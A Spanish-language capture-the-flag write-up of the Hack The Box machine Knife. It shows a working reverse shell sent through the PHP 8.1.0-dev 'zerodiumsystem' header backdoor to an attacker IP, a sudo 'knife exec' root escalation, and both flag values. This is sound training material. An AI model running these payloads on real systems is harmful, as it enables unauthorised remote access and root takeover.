# Knife — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [Knife](https://app.hackthebox.com/machines/Knife) |
| **Plataforma** | [Hack The Box](https://hackthebox.com/) |
| **Sistema Operativo** | Linux (Ubuntu) |
| **Dificultad** | Fácil |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

```bash
nmap -p- -sCV -T5 10.129.35.188 -oN Knife
```

![Nmap Scan](images/01.JPG)

| Puerto | Servicio | Versión |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.41 (Ubuntu) — título: *Emergent Medical Idea* |

---

## Enumeración Web

Al acceder al puerto 80 se muestra la web de **EMA** (Emergent Medical Idea), una página corporativa sin contenido interactivo aparente:

![Web](images/02.JPG)

### Inspección de cabeceras HTTP

Se analizan las cabeceras de respuesta del servidor:

```bash
curl -I http://10.129.35.188/
```

![Cabeceras HTTP](images/03.JPG)

La cabecera `X-Powered-By` revela algo crítico:

```
X-Powered-By: PHP/8.1.0-dev
```

La versión **PHP 8.1.0-dev** es una build de desarrollo que fue comprometida en un ataque a la cadena de suministro. Se introdujo un **backdoor** en el código fuente oficial de PHP que permite ejecución remota de comandos a través de una cabecera HTTP manipulada: `User-Agentt` (con doble `t`). Cualquier valor que empiece por `zerodiumsystem(` es interpretado y ejecutado como código PHP en el servidor.

---

## Acceso Inicial — RCE via PHP 8.1.0-dev Backdoor

### Preparar el listener

Se abre un listener en la máquina atacante:

```bash
nc -lvnp 9001
```

### Explotar el backdoor

Se envía la reverse shell a través de la cabecera maliciosa:

```bash
curl http://10.129.35.188/ -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.7/9001 0>&1\"');"
```

| Elemento | Descripción |
|---|---|
| `User-Agentt` | Cabecera manipulada con doble `t` que activa el backdoor |
| `zerodiumsystem(...)` | Prefijo que el backdoor evalúa como `system()` de PHP |
| `bash -i >& /dev/tcp/...` | Payload de reverse shell hacia la máquina atacante |

![Exploit Curl](images/04a.JPG)

### Shell recibida

![Netcat Shell](images/04b.JPG)

Se obtiene conexión como el usuario **`james`**.

---

## Flag de usuario

```bash
whoami
```

![Whoami](images/05.JPG)

```bash
cd /home/james
ls
cat user.txt
```

![User Flag](images/06.JPG)

Flag: **`82d1a1e5b058a21a4814ef02b8df4f63`**

---

## Escalada de Privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

![Sudo -l](images/07.JPG)

```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

El usuario `james` puede ejecutar **knife** como `root` sin contraseña. `knife` es la herramienta de línea de comandos de **Chef**, un sistema de gestión de configuración. Tiene un subcomando `exec` que permite ejecutar código Ruby arbitrario, lo que lo convierte en un vector de escalada trivial documentado en [GTFOBins](https://gtfobins.github.io/gtfobins/knife/).

### Explotación

```bash
sudo knife exec -E 'exec "/bin/bash"'
```

| Parámetro | Descripción |
|---|---|
| `knife exec` | Ejecuta un script Ruby en el contexto de Chef |
| `-E '...'` | Permite pasar el código Ruby directamente como argumento |
| `exec "/bin/bash"` | Reemplaza el proceso actual por una shell de bash (heredando los privilegios de root) |

![Knife Exec](images/08.JPG)

```bash
whoami
# root
```

### Flag de root

```bash
cd /root
ls
cat root.txt
```

![Root Flag](images/09.JPG)

Flag: **`7db1e3a782bc9623836e522a84814338`**

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port Scan | `nmap` |
| Fingerprinting | Inspección de cabeceras HTTP | `curl -I` |
| Acceso inicial | RCE via PHP 8.1.0-dev backdoor | `curl` + `nc` |
| Escalada | Sudo + GTFOBins (`knife exec`) | `knife` |
